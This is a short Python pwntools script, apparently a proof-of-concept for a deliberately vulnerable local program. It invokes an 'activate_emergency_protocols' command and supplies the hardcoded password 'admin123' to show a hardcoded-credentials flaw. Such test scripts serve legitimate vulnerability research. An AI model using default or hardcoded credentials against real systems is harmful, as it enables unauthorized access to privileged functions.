#!/usr/bin/python3

from pwn import *
import os
import warnings

def main():
    warnings.filterwarnings("ignore", category=BytesWarning)
    context.log_level = 'error'

    env = os.environ.copy()
    env['LD_LIBRARY_PATH'] = './runner/external/'

    pid = process(['./runner/run.sh'], env=env)
    pid.recv(numb=100, timeout=1.0)
    pid.sendline(b'activate_emergency_protocols')

    pid.recv(100, 1.0)
    pid.sendline(b'admin123')

    line = pid.recvline()

    print(text.red("[+]") + " Vuln Hardcoded Credentials - activate_emergency_protocols:")
    print(line.decode()[26:])

if __name__ == "__main__":
    main()